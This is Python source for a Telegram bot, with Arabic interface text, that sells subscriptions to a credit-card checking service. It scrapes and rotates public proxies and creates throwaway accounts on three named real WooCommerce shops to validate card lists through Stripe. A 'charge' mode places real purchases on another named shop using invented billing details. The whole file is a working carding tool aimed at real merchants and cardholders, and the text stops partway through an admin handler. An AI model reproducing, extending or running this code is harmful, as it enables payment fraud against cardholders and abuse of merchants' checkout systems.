import telebot
import requests
import json
import re
import time
import random
import threading
import os
import sys
import sqlite3
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from telebot import types
from collections import OrderedDict
import logging

# ================= إعدادات التسجيل =================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ================= قراءة التوكن ومعرف الأدمن =================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))

if not BOT_TOKEN or not ADMIN_ID:
    print("❌ خطأ: لم يتم تعيين BOT_TOKEN أو ADMIN_ID")
    sys.exit(1)

try:
    bot = telebot.TeleBot(BOT_TOKEN)
    print("✅ تم التحقق من التوكن بنجاح")
except Exception as e:
    print(f"❌ خطأ في التوكن: {e}")
    sys.exit(1)

# ================= قاعدة البيانات (مع دعم Railway) =================
# ✅ استخدام متغير بيئة للمسار (يدعم Railway Volume)
DB_PATH = os.environ.get('DB_PATH', '/app/data/bot_database.db')

# إنشاء مجلد البيانات تلقائياً إذا لم يكن موجوداً
DB_DIR = os.path.dirname(DB_PATH)
if not os.path.exists(DB_DIR):
    os.makedirs(DB_DIR)
    print(f"📁 تم إنشاء مجلد البيانات: {DB_DIR}")

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        subscription_end TEXT,
        credits INTEGER DEFAULT 0,
        used_codes TEXT DEFAULT ''
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY,
        duration_days INTEGER,
        created_by INTEGER,
        used_by INTEGER DEFAULT NULL,
        used_at TEXT DEFAULT NULL,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS proxies (
        proxy TEXT PRIMARY KEY,
        success_count INTEGER DEFAULT 0,
        fail_count INTEGER DEFAULT 0,
        status TEXT DEFAULT 'active',
        last_used TEXT
    )''')
    conn.commit()
    conn.close()
    print(f"✅ تم تهيئة قاعدة البيانات في: {DB_PATH}")

init_db()

# ================= دوال الاشتراكات =================
def is_subscription_active(user_id):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT subscription_end, credits FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        end_str, credits = row
        if end_str:
            end_date = datetime.fromisoformat(end_str)
            if end_date > datetime.now():
                return True
        if credits and credits > 0:
            return True
    return False

def redeem_code(user_id, code):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT duration_days, used_by FROM redeem_codes WHERE code = ?", (code,))
    row = c.fetchone()
    if not row or row[1] is not None:
        conn.close()
        return False, "❌ كود غير صالح أو مستخدم من قبل"
    duration_days = row[0]
    now = datetime.now()
    c.execute("SELECT subscription_end FROM users WHERE user_id = ?", (user_id,))
    existing = c.fetchone()
    if existing and existing[0]:
        current_end = datetime.fromisoformat(existing[0])
        new_end = max(current_end, now) + timedelta(days=duration_days)
    else:
        new_end = now + timedelta(days=duration_days)
    c.execute("INSERT OR REPLACE INTO users (user_id, subscription_end) VALUES (?, ?)", (user_id, new_end.isoformat()))
    c.execute("UPDATE redeem_codes SET used_by = ?, used_at = ? WHERE code = ?", (user_id, now.isoformat(), code))
    conn.commit()
    conn.close()
    return True, f"✅ تم تفعيل الاشتراك لمدة {duration_days} يوم"

def generate_redeem_code(admin_user_id, days):
    code = ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ0123456789', k=12))
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO redeem_codes (code, duration_days, created_by) VALUES (?, ?, ?)", (code, days, admin_user_id))
    conn.commit()
    conn.close()
    return code

def get_all_codes():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT code, duration_days, used_by, used_at, created_at FROM redeem_codes ORDER BY created_at DESC")
    rows = c.fetchall()
    conn.close()
    return rows

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT user_id, subscription_end, credits FROM users ORDER BY user_id")
    rows = c.fetchall()
    conn.close()
    return rows

def revoke_code(code):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("DELETE FROM redeem_codes WHERE code = ? AND used_by IS NULL", (code,))
    deleted = c.rowcount
    conn.commit()
    conn.close()
    return deleted > 0

# ================= دوال البروكسيات =================
def add_proxy_to_db(proxy):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute("INSERT INTO proxies (proxy) VALUES (?)", (proxy,))
        conn.commit()
    except:
        pass
    conn.close()

def get_all_proxies():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT proxy, success_count, fail_count, status FROM proxies WHERE status = 'active'")
    rows = c.fetchall()
    conn.close()
    return rows

def update_proxy_success(proxy):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE proxies SET success_count = success_count + 1, status = 'active' WHERE proxy = ?", (proxy,))
    conn.commit()
    conn.close()

def update_proxy_failure(proxy):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE proxies SET fail_count = fail_count + 1 WHERE proxy = ?", (proxy,))
    c.execute("UPDATE proxies SET status = 'dead' WHERE proxy = ? AND fail_count >= 3", (proxy,))
    conn.commit()
    conn.close()

# ================= ProxyPool =================
class ProxyPool:
    def __init__(self, max_retries=2, backoff_factor=1, rate_limit=10, rate_period=60):
        self.proxies = OrderedDict()
        self.lock = threading.Lock()
        self.max_retries = max_retries
        self.backoff_factor = backoff_factor
        self.rate_limit = rate_limit
        self.rate_period = rate_period
        self.load_from_db()

    def load_from_db(self):
        rows = get_all_proxies()
        for proxy, success, fail, status in rows:
            self.proxies[proxy] = {
                'success': success, 'failure': fail, 'last_used': 0,
                'status': status, 'request_timestamps': []
            }
        logger.info(f"📁 تم تحميل {len(self.proxies)} بروكسي من قاعدة البيانات")

    def add_proxy(self, proxy):
        with self.lock:
            if proxy not in self.proxies:
                self.proxies[proxy] = {
                    'success': 0, 'failure': 0, 'last_used': 0,
                    'status': 'active', 'request_timestamps': []
                }
                add_proxy_to_db(proxy)

    def _clean_old_timestamps(self, proxy_stats):
        now = time.time()
        proxy_stats['request_timestamps'] = [ts for ts in proxy_stats['request_timestamps'] if now - ts < self.rate_period]

    def _is_rate_limited(self, proxy_stats):
        self._clean_old_timestamps(proxy_stats)
        return len(proxy_stats['request_timestamps']) >= self.rate_limit

    def get_proxy(self):
        with self.lock:
            active_proxies = [(p, stats) for p, stats in self.proxies.items() if stats['status'] == 'active']
            if not active_proxies:
                return None
            def score(stats):
                total = stats['success'] + stats['failure']
                return stats['success'] / total if total > 0 else 1.0
            best = max(active_proxies, key=lambda x: score(x[1]))
            proxy = best[0]
            if self._is_rate_limited(self.proxies[proxy]):
                for p, stats in active_proxies:
                    if p != proxy and not self._is_rate_limited(stats):
                        proxy = p
                        break
            self.proxies[proxy]['last_used'] = time.time()
            self.proxies[proxy]['request_timestamps'].append(time.time())
            return proxy

    def report_success(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies[proxy]['success'] += 1
                self.proxies[proxy]['status'] = 'active'
                update_proxy_success(proxy)

    def report_failure(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies[proxy]['failure'] += 1
                if self.proxies[proxy]['failure'] >= 3:
                    self.proxies[proxy]['status'] = 'dead'
                update_proxy_failure(proxy)

    def get_stats(self):
        with self.lock:
            active = sum(1 for s in self.proxies.values() if s['status'] == 'active')
            banned = sum(1 for s in self.proxies.values() if s['status'] == 'banned')
            dead = sum(1 for s in self.proxies.values() if s['status'] == 'dead')
            return active, banned, dead

proxy_pool = ProxyPool()

# ================= جلب البروكسيات =================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
]

def fetch_proxies_from_github():
    all_proxies = []
    for url in PROXY_SOURCES:
        try:
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                proxies = response.text.strip().splitlines()
                cleaned = [p.strip() for p in proxies if p.strip() and not p.startswith('#') and ':' in p]
                all_proxies.extend(cleaned)
        except:
            pass
    return list(set(all_proxies))

def check_proxy_accurate(proxy):
    try:
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        r = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=8)
        if r.status_code == 200:
            return proxy
    except:
        pass
    return None

def add_proxies_to_pool(proxy_list):
    working = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(check_proxy_accurate, p): p for p in proxy_list}
        for future in as_completed(futures):
            res = future.result()
            if res:
                working.append(res)
                proxy_pool.add_proxy(res)
    return working

# ================= البوابات =================
# بوابات Auth (3 بوابات)
AUTH_GATES = {
    '1': {'name': '🏦 كوبنهاجن سيلفر', 'site': 'https://copenhagensilver.com'},
    '2': {'name': '💳 سبوكان شيرت', 'site': 'https://www.spokaneshirtco.com'},
    '3': {'name': '🔥 فور أول بروموز', 'site': 'https://www.4allpromos.com'}
}

# بوابة Charge (1 بوابة)
CHARGE_GATE = {
    'site': 'https://www.hornbakersrepairandwelding.com',
    'name': '🛒 Hornbakers Charge',
    'product_id': '6887',
    'product_url': '/shop/tools-2/tools-other-tools-2/tie-cable-nylon-4-black/'
}

# تخزين اختيارات المستخدم
user_gate_choice = {}
user_check_type = {}

# ================= بيانات الفاتورة للـ Charge =================
BILLING_INFO = {
    'first_name': 'Oscar',
    'last_name': 'Graves',
    'company': 'Goji Hair',
    'country': 'US',
    'address_1': '2094 Plum St',
    'city': 'Fayetteville',
    'state': 'HI',
    'postcode': '33150',
    'phone': '(571) 241-0677',
    'email': lambda: f"{random.randint(100000,999999)}@temp.com"
}

# ================= BIN Lookup =================
def get_bin_info(bin6):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin6}", timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {
                "brand": data.get("scheme", "Unknown").upper(),
                "type": data.get("type", "Unknown").capitalize(),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "flag": data.get("country", {}).get("emoji", "🌍")
            }
    except:
        pass
    return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🌍"}

# ================= فحص Auth (على بوابة واحدة) =================
def check_card_auth_single(card_str, site_url, proxy=None):
    parts = card_str.split('|')
    if len(parts) != 4:
        return "INVALID_FORMAT"
    cc, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year

    proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    session = requests.Session()
    
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        
        resp = session.get(f"{site_url}/my-account/", headers=headers, proxies=proxy_dict, timeout=15)
        reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', resp.text)
        if not reg_nonce:
            return "FAILED_NONCE"
        reg_nonce = reg_nonce.group(1)

        email = f"{random.randint(100000,999999)}@temp.com"
        data = {
            'email': email, 'password': 'Pass123!',
            'woocommerce-register-nonce': reg_nonce,
            'register': 'Register', '_wp_http_referer': '/my-account/'
        }
        session.post(f"{site_url}/my-account/", data=data, headers=headers, proxies=proxy_dict, timeout=15)

        resp = session.get(f"{site_url}/my-account/add-payment-method/", headers=headers, proxies=proxy_dict, timeout=15)
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', resp.text)
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', resp.text)
        if not pk_match or not nonce_match:
            return "FAILED_STRIPE_EXTRACT"
        
        stripe_pk = pk_match.group(0)
        setup_nonce = nonce_match.group(1)

        stripe_data = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': month, 'card[exp_year]': year[-2:],
            'key': stripe_pk, '_stripe_version': '2024-06-20'
        }
        resp = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data,
                          headers={'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://js.stripe.com'},
                          proxies=proxy_dict, timeout=15)
        pm_id = resp.json().get('id')
        if not pm_id:
            return "DECLINED"

        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': setup_nonce
        }
        resp = session.post(f"{site_url}/wp-admin/admin-ajax.php", data=ajax_data,
                          headers={'X-Requested-With': 'XMLHttpRequest'}, proxies=proxy_dict, timeout=15)
        result = resp.json()
        
        if result.get('success'):
            return "PASSED"
        else:
            error_msg = result.get('data', {}).get('error', {}).get('message', '')
            if 'otp' in error_msg.lower() or '3d' in error_msg.lower():
                return "OTP"
            return "DECLINED"
    except Exception as e:
        return f"ERROR"

def check_card_auth_with_retry(card_str, site_url):
    for attempt in range(proxy_pool.max_retries):
        proxy = proxy_pool.get_proxy()
        status = check_card_auth_single(card_str, site_url, proxy)
        if status in ("PASSED", "OTP"):
            if proxy:
                proxy_pool.report_success(proxy)
            return status
        else:
            if proxy:
                proxy_pool.report_failure(proxy)
            if attempt < proxy_pool.max_retries - 1:
                time.sleep(proxy_pool.backoff_factor * (2 ** attempt))
    return "DECLINED"

# ================= فحص Auth متعدد البوابات =================
def check_card_multi_auth(card_str):
    results = []
    gates_order = ['1', '2', '3']
    
    for gate_id in gates_order:
        site_url = AUTH_GATES[gate_id]['site']
        gate_name = AUTH_GATES[gate_id]['name']
        status = check_card_auth_with_retry(card_str, site_url)
        results.append({'gate': gate_name, 'status': status})
        
        if status == "DECLINED":
            break
    
    passed_count = sum(1 for r in results if r['status'] == "PASSED")
    otp_count = sum(1 for r in results if r['status'] == "OTP")
    
    if otp_count > 0:
        final_status = "🔐 3D SECURE"
        emoji = "⚠️"
    elif passed_count == 3:
        final_status = "💪💪💪 SUPER LIVE"
        emoji = "✅✅✅"
    elif passed_count == 2:
        final_status = "💪💪 LIVE"
        emoji = "✅✅"
    elif passed_count == 1:
        final_status = "💪 MAYBE LIVE"
        emoji = "✅"
    else:
        final_status = "💀 DEAD"
        emoji = "❌"
    
    return final_status, emoji, results

# ================= فحص Charge =================
def check_card_charge(card_str, proxy=None):
    parts = card_str.split('|')
    if len(parts) != 4:
        return "INVALID_FORMAT", None
    cc, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year

    proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    session = requests.Session()
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'
        }
        
        site_url = CHARGE_GATE['site']
        product_url = CHARGE_GATE['product_url']
        product_id = CHARGE_GATE['product_id']
        
        files = {'quantity': (None, '1'), 'add-to-cart': (None, product_id)}
        resp = session.post(f"{site_url}{product_url}", files=files, headers=headers, proxies=proxy_dict, timeout=15)
        
        resp = session.get(f"{site_url}/checkout/", headers=headers, proxies=proxy_dict, timeout=15)
        checkout_html = resp.text
        
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', checkout_html)
        nonce_match = re.search(r'woocommerce-process-checkout-nonce["\s]+value=["\']([^"\']+)', checkout_html)
        
        if not pk_match or not nonce_match:
            pk_match = re.search(r'"key":"(pk_live_[^"]+)"', checkout_html)
            nonce_match = re.search(r'"nonce":"([^"]+)"', checkout_html)
        
        if not pk_match or not nonce_match:
            return "FAILED_EXTRACT", None
        
        stripe_pk = pk_match.group(0) if pk_match.group(0).startswith('pk_') else pk_match.group(1)
        checkout_nonce = nonce_match.group(1)
        
        email = BILLING_INFO['email']() if callable(BILLING_INFO['email']) else BILLING_INFO['email']
        stripe_data = {
            'type': 'card',
            'billing_details[name]': f"{BILLING_INFO['first_name']} {BILLING_INFO['last_name']}",
            'billing_details[address][line1]': BILLING_INFO['address_1'],
            'billing_details[address][state]': BILLING_INFO['state'],
            'billing_details[address][city]': BILLING_INFO['city'],
            'billing_details[address][postal_code]': BILLING_INFO['postcode'],
            'billing_details[address][country]': BILLING_INFO['country'],
            'billing_details[email]': email,
            'billing_details[phone]': BILLING_INFO['phone'],
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'key': stripe_pk,
            'payment_user_agent': 'stripe.js/v3',
            'referrer': site_url
        }
        
        stripe_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/'
        }
        
        resp = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data,
                          headers=stripe_headers, proxies=proxy_dict, timeout=15)
        pm_data = resp.json()
        pm_id = pm_data.get('id')
        
        if not pm_id:
            error = pm_data.get('error', {})
            if 'otp' in str(error).lower() or '3d' in str(error).lower():
                return "OTP", None
            return "DECLINED", None
        
        checkout_data = {
            'billing_first_name': BILLING_INFO['first_name'],
            'billing_last_name': BILLING_INFO['last_name'],
            'billing_company': BILLING_INFO['company'],
            'billing_country': BILLING_INFO['country'],
            'billing_address_1': BILLING_INFO['address_1'],
            'billing_city': BILLING_INFO['city'],
            'billing_state': BILLING_INFO['state'],
            'billing_postcode': BILLING_INFO['postcode'],
            'billing_phone': BILLING_INFO['phone'],
            'billing_email': email,
            'shipping_first_name': BILLING_INFO['first_name'],
            'shipping_last_name': BILLING_INFO['last_name'],
            'shipping_country': BILLING_INFO['country'],
            'shipping_address_1': BILLING_INFO['address_1'],
            'shipping_city': BILLING_INFO['city'],
            'shipping_state': BILLING_INFO['state'],
            'shipping_postcode': BILLING_INFO['postcode'],
            'payment_method': 'stripe',
            'woocommerce-process-checkout-nonce': checkout_nonce,
            'stripe_source': pm_id,
            '_wp_http_referer': '/?wc-ajax=update_order_review'
        }
        
        checkout_headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': site_url,
            'Referer': f"{site_url}/checkout/"
        }
        
        resp = session.post(f"{site_url}/?wc-ajax=checkout", data=checkout_data,
                          headers=checkout_headers, proxies=proxy_dict, timeout=15)
        result = resp.json()
        
        if result.get('result') == 'success':
            return "CHARGED", result.get('redirect')
        else:
            messages = result.get('messages', '')
            if 'otp' in str(messages).lower() or '3d' in str(messages).lower():
                return "OTP", None
            return "DECLINED", None
            
    except Exception as e:
        return f"ERROR: {str(e)[:50]}", None

def check_card_charge_with_retry(card_str):
    for attempt in range(proxy_pool.max_retries):
        proxy = proxy_pool.get_proxy()
        status, redirect = check_card_charge(card_str, proxy)
        if status in ("CHARGED", "OTP"):
            if proxy:
                proxy_pool.report_success(proxy)
            return status, redirect
        else:
            if proxy:
                proxy_pool.report_failure(proxy)
            if attempt < proxy_pool.max_retries - 1:
                time.sleep(proxy_pool.backoff_factor * (2 ** attempt))
    return "DECLINED", None

# ================= معالجة البطاقات =================
def process_single_card_auth(card, idx, total, chat_id):
    final_status, emoji, results = check_card_multi_auth(card)
    bin6 = card.split('|')[0][:6]
    bin_info = get_bin_info(bin6)
    
    msg = f"""{emoji} **{final_status}** | Multi-Auth
`{card}`

**📊 تفاصيل الفحص:**
"""
    for r in results:
        if r['status'] == "PASSED":
            msg += f"✅ {r['gate']}: PASSED\n"
        elif r['status'] == "OTP":
            msg += f"⚠️ {r['gate']}: OTP\n"
        else:
            msg += f"❌ {r['gate']}: DECLINED\n"
    
    msg += f"""
**BIN:** {bin6} | **Brand:** {bin_info['brand']}
**Type:** {bin_info['type']} | **Bank:** {bin_info['bank']}
**Country:** {bin_info['country']} {bin_info['flag']}
╔════════════════════╗
║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
╚════════════════════╝
**Progress:** {idx}/{total}"""
    
    bot.send_message(chat_id, msg, parse_mode="Markdown")
    return final_status

def process_single_card_charge(card, idx, total, chat_id):
    status, redirect = check_card_charge_with_retry(card)
    bin6 = card.split('|')[0][:6]
    bin_info = get_bin_info(bin6)
    
    if status == "CHARGED":
        emoji, result_text = "💰", "CHARGED (تم الخصم)"
        extra = f"\n🔗 **Link:** {redirect}" if redirect else ""
    elif status == "OTP":
        emoji, result_text = "⚠️", "OTP REQUIRED"
        extra = ""
    else:
        emoji, result_text = "❌", "DECLINED"
        extra = ""
    
    msg = f"""{emoji} **{result_text}** | {CHARGE_GATE['name']}
`{card}`{extra}

**BIN:** {bin6} | **Brand:** {bin_info['brand']}
**Type:** {bin_info['type']} | **Bank:** {bin_info['bank']}
**Country:** {bin_info['country']} {bin_info['flag']}
╔════════════════════╗
║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
╚════════════════════╝
**Progress:** {idx}/{total}"""
    
    bot.send_message(chat_id, msg, parse_mode="Markdown")
    return status

def check_cards(cards_text, chat_id, message_id, check_type):
    cards = [c.strip() for c in cards_text.splitlines() if "|" in c and len(c.split('|')) == 4]
    if not cards:
        bot.edit_message_text("❌ لم يتم العثور على بطاقات صالحة. الصيغة: رقم|شهر|سنة|cvv", chat_id, message_id)
        return
    
    total = len(cards)
    check_name = "Multi-Auth (3 Gates)" if check_type == 'auth' else "Charge (1 Gate)"
    bot.edit_message_text(f"🚀 بدء فحص {total} بطاقة | {check_name}...", chat_id, message_id)
    
    passed = otp = declined = charged = 0
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        if check_type == 'auth':
            futures = {executor.submit(process_single_card_auth, card, idx, total, chat_id): card 
                      for idx, card in enumerate(cards, 1)}
        else:
            futures = {executor.submit(process_single_card_charge, card, idx, total, chat_id): card 
                      for idx, card in enumerate(cards, 1)}
        
        for future in as_completed(futures):
            try:
                status = future.result()
                if check_type == 'auth':
                    if 'SUPER LIVE' in status or 'LIVE' in status:
                        passed += 1
                    elif '3D SECURE' in status:
                        otp += 1
                    else:
                        declined += 1
                else:
                    if status == "CHARGED":
                        charged += 1
                    elif status == "OTP":
                        otp += 1
                    else:
                        declined += 1
            except:
                declined += 1
    
    if check_type == 'auth':
        summary = f"""🏁 **ملخص فحص Multi-Auth**
✅ LIVE/SUPER: {passed}
⚠️ 3D SECURE: {otp}
❌ DECLINED: {declined}
╔════════════════════╗
║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
╚════════════════════╝"""
    else:
        summary = f"""🏁 **ملخص فحص Charge**
💰 CHARGED: {charged}
⚠️ OTP: {otp}
❌ DECLINED: {declined}
╔════════════════════╗
║🔥𝐂𝐇𝐄𝐂𝐊 𝐁𝐘 : 𝕭𝖆𝕭𝖆_𝕸𝖊𝕯𝖎𝖆🔥║
╚════════════════════╝"""
    
    bot.send_message(chat_id, summary, parse_mode="Markdown")

# ================= أوامر البوت =================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(message, "👋 مرحباً أدمن!\n\n"
                    "📌 الأوامر:\n"
                    "/admin - لوحة التحكم\n"
                    "/check - اختيار نوع الفحص\n"
                    "/status - حالة البروكسيات")
    else:
        if is_subscription_active(user_id):
            bot.reply_to(message, "👋 مرحباً! اشتراكك نشط.\n\n"
                        "📌 الأوامر:\n"
                        "/check - اختيار نوع الفحص\n"
                        "/redeem - تفعيل كود")
        else:
            bot.reply_to(message, "⛔ ليس لديك اشتراك.\nاستخدم `/redeem <الكود>`", parse_mode="Markdown")

@bot.message_handler(commands=['redeem'])
def redeem(message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        bot.reply_to(message, "أنت الأدمن، لا تحتاج لتفعيل اشتراك.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ الاستخدام: `/redeem <الكود>`", parse_mode="Markdown")
        return
    code = parts[1].strip()
    success, msg = redeem_code(user_id, code)
    bot.reply_to(message, msg)

@bot.message_handler(commands=['check'])
def check_command(message):
    user_id = message.from_user.id
    if not is_subscription_active(user_id):
        bot.reply_to(message, "⛔ اشتراكك غير نشط. استخدم /redeem")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🛡️ فحص Auth (3 بوابات - مجاني)", callback_data="check_auth"),
        types.InlineKeyboardButton("💰 فحص Charge (1 بوابة - خصم فعلي)", callback_data="check_charge")
    )
    bot.send_message(user_id, "🎯 اختر نوع الفحص:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('check_'))
def select_check_type(call):
    user_id = call.from_user.id
    if not is_subscription_active(user_id):
        bot.answer_callback_query(call.id, "اشتراكك غير نشط")
        return
    
    check_type = call.data.split('_')[1]
    user_check_type[user_id] = check_type
    
    if check_type == 'auth':
        msg = "✅ تم اختيار **فحص Auth متعدد البوابات**\n\n"
        msg += "📊 النظام:\n"
        msg += "• 3 بوابات WooCommerce + Stripe\n"
        msg += "• فحص متتابع (إذا فشلت تتوقف)\n"
        msg += "• التصنيف: SUPER LIVE / LIVE / MAYBE LIVE / DEAD\n\n"
        msg += "🎯 الآن اختر البوابة المفضلة (اختياري):"
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("⚡ فحص سريع (3 بوابات تلقائي)", callback_data="gate_auto"),
            types.InlineKeyboardButton(AUTH_GATES['1']['name'], callback_data="gate_1"),
            types.InlineKeyboardButton(AUTH_GATES['2']['name'], callback_data="gate_2"),
            types.InlineKeyboardButton(AUTH_GATES['3']['name'], callback_data="gate_3")
        )
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    else:
        msg = "✅ تم اختيار **فحص Charge**\n\n"
        msg += f"🛒 البوابة: {CHARGE_GATE['name']}\n"
        msg += f"💵 سيتم خصم مبلغ فعلي من البطاقة\n"
        msg += f"📦 المنتج: {CHARGE_GATE['product_url']}\n\n"
        msg += "⚠️ **تحذير:** هذا فحص حقيقي يخصم أموال!\n\n"
        msg += "أرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('gate_'))
def select_gate(call):
    user_id = call.from_user.id
    if not is_subscription_active(user_id):
        bot.answer_callback_query(call.id, "اشتراكك غير نشط")
        return
    
    gate_id = call.data.split('_')[1]
    if gate_id == 'auto':
        user_gate_choice[user_id] = 'auto'
        msg = "✅ تم اختيار **الفحص التلقائي على 3 بوابات**\n\nأرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
    else:
        user_gate_choice[user_id] = gate_id
        msg = f"✅ تم اختيار {AUTH_GATES[gate_id]['name']}\nأرسل البطاقات الآن (رقم|شهر|سنة|cvv)"
    
    bot.edit_message_text(msg, call.message.chat.id, call.message.message_id)

@bot.message_handler(commands=['status'])
def status(message):
    if message.from_user.id != ADMIN_ID:
        return
    active, banned, dead = proxy_pool.get_stats()
    bot.reply_to(message, f"📊 **حالة البروكسيات:**\n🟢 نشط: {active}\n🟡 محظور: {banned}\n🔴 ميت: {dead}", parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    user_id = message.from_user.id
    if not is_subscription_active(user_id):
        bot.reply_to(message, "⛔ اشتراكك غير نشط")
        return
    
    file_info = bot.get_file(message.document.file_id)
    content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
    filename = message.document.file_name.lower()
    
    if "proxy" in filename:
        proxies = [p.strip() for p in content.splitlines() if p.strip() and ':' in p]
        if proxies:
            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
            bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
        else:
            bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
    else:
        check_type = user_check_type.get(user_id, 'auth')
        sent_msg = bot.reply_to(message, f"🚀 جاري الفحص...")
        threading.Thread(target=check_cards, args=(content, message.chat.id, sent_msg.message_id, check_type)).start()

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    user_id = message.from_user.id
    if not is_subscription_active(user_id):
        bot.reply_to(message, "⛔ اشتراكك غير نشط")
        return
    
    text = message.text.strip()
    
    if ":" in text and "|" not in text and not text.startswith('/'):
        proxies = [p.strip() for p in text.splitlines() if p.strip() and ':' in p]
        if proxies:
            threading.Thread(target=add_proxies_to_pool, args=(proxies,)).start()
            bot.reply_to(message, f"🔍 جاري إضافة {len(proxies)} بروكسي...")
        else:
            bot.reply_to(message, "❌ لا توجد بروكسيات صالحة.")
    elif "|" in text:
        check_type = user_check_type.get(user_id)
        if not check_type:
            bot.reply_to(message, "❌ لم تختر نوع الفحص بعد. استخدم /check")
            return
        
        sent_msg = bot.reply_to(message, f"🚀 جاري الفحص...")
        threading.Thread(target=check_cards, args=(text, message.chat.id, sent_msg.message_id, check_type)).start()
    else:
        bot.reply_to(message, "❌ أرسل بطاقات (رقم|شهر|سنة|cvv) أو بروكسيات (ip:port)")

# ================= لوحة الإدارة =================
admin_session = {}

@bot.message_handler(commands=['admin'])
def admin_login(message):
    user_id = message.from_user.id
